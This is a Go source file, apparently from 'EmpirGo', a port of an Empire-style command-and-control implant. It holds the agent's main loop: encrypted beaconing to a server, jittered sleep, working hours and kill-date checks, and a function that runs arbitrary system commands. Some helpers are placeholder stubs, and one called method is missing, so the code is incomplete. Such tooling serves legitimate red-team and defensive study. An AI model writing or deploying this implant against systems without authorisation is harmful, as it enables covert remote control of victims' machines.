package agent

import (
	"EmpirGo/common"
	"EmpirGo/comms"
	"encoding/base64"
	"os"
	"os/exec"
	"strings"
	"time"
)

type MessageSender interface {
	SendMessage(routingPacket []byte) ([]byte, error)
}

type Task struct {
	Command string
	Args    []string
	Result  chan string
	Status  chan string
	// TODO: Main loop would send a "quit" signal here to kill a running task.
	Quit chan bool
}

type MainAgent struct {
	PacketHandler comms.PacketHandler
	MessageSender MessageSender
	profile       string
	server        string
	sessionID     string
	killDate      string
	workingHours  string
	delay         int
	jitter        float64
	lostLimit     int
	// TODO: Remove from MainAgent
	defaultResponse  string
	jobMessageBuffer string
	socksThread      bool
	socksQueue       chan bool
	tasks            map[string]*Task
	userAgent        string
	headers          map[string]string
	encryptionKey    []byte
}

func NewMainAgent(packetHandler comms.PacketHandler, messagesender *comms.HttpMessageSender, sessionID, killDate, workingHours string, delay int, jitter float64, lostLimit int, aeskey []byte, defaultResponse string) *MainAgent {
	packetHandler.SessionID = sessionID

	return &MainAgent{
		PacketHandler: packetHandler,
		MessageSender: messagesender,
		sessionID:     sessionID,
		killDate:      killDate,
		workingHours:  workingHours,
		delay:         delay,
		jitter:        jitter,
		lostLimit:     lostLimit,
		// TODO: Remove the use of this from main agent and just use it in the sender
		defaultResponse: defaultResponse,
		tasks:           make(map[string]*Task),
		encryptionKey:   aeskey,
	}
}

func (ma *MainAgent) AgentExit() {
	if len(ma.tasks) > 0 {
		for _, task := range ma.tasks {
			task.Status <- "kill"
		}
	}
	os.Exit(0)
}

func (ma *MainAgent) SendJobMessageBuffer() {
	result := ma.GetJobMessageBuffer()
	ProcessJobTasking(result)
}

func (ma *MainAgent) preparepacket(packets []byte) ([]byte, error) {
	if packets != nil {
		encData := common.AesEncryptThenHMAC(ma.PacketHandler.Aeskey, packets)
		routingPacket := ma.PacketHandler.BuildRoutingPacket(ma.PacketHandler.StagingKey, ma.sessionID, 5, 0, encData)
		data, err := ma.MessageSender.SendMessage(routingPacket)
		return data, err
	} else {
		routingPacket := ma.PacketHandler.BuildRoutingPacket(ma.PacketHandler.StagingKey, ma.sessionID, 4, 0, nil)
		data, err := ma.MessageSender.SendMessage(routingPacket)
		return data, err
	}
}

func (ma *MainAgent) RunCommand(command string, cmdargs ...string) string {
	cmd := exec.Command(command, cmdargs...)
	output, _ := cmd.CombinedOutput()
	return string(output)
}

// Placeholder functions to avoid compilation errors
func (ma *MainAgent) GetJobMessageBuffer() string {
	return ""
}

func ProcessJobTasking(result string) {}

func (ma *MainAgent) Run() {
	for {
		if ma.workingHours != "" {
			startEnd := strings.Split(ma.workingHours, "-")
			if len(startEnd) == 2 {
				now := time.Now()
				start, err1 := time.Parse("15:04", startEnd[0])
				end, err2 := time.Parse("15:04", startEnd[1])
				if err1 == nil && err2 == nil {
					if now.Before(start) || now.After(end) {
						sleepDuration := start.Sub(now)
						if now.After(end) {
							sleepDuration = time.Until(start.Add(24 * time.Hour))
						}
						time.Sleep(sleepDuration)
					}
				}
			}
		}

		if ma.killDate != "" {
			now := time.Now().Format("01/02/2006")
			if now >= ma.killDate {
				ma.AgentExit()
			}
		}

		if ma.PacketHandler.MissedCheckins >= ma.lostLimit {
			ma.AgentExit()
		}

		ma.SendJobMessageBuffer()

		minSleep := int((1.0 - ma.jitter) * float64(ma.delay))
		maxSleep := int((1.0 + ma.jitter) * float64(ma.delay))
		sleepTime := common.RandomInt(minSleep, maxSleep)
		time.Sleep(time.Duration(sleepTime) * time.Second)

		data, err := ma.preparepacket(nil)
		if err == nil && len(data) != 0 {
			ma.PacketHandler.MissedCheckins = 0
			base64string := base64.StdEncoding.EncodeToString(data)

			// TODO: Move defaultresponse to the messagesender
			if len(data) == 0 || base64string == ma.defaultResponse {
				continue
			} else {

				packet, _ := ma.PacketHandler.DecodeRoutingPacket(data, ma.PacketHandler.StagingKey, ma.sessionID)
				ma.processTasking(packet)
			}
		}
	}
}
